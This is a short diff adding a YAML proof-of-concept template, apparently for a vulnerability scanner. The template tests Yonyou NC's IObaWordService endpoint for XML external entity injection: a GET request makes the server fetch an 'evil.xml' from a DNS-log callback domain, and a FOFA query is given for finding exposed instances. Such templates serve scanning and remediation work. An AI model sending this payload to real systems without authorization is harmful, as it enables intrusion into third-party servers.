@@ -1,0 +1,21 @@
+id: poc-yaml-yongyou-iobawordservice-xxe
+info:
+  name: 用友NC IObaWordService接口存在xml外部实体注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /uapws/service/nc.itf.bap.oba.IObaWordService?xsd=http://{{.reverseDomain}}/evil.xml
+  expression: 'reverse.Verify() &&
+
+    status_code == 500
+
+    '
+transport: http
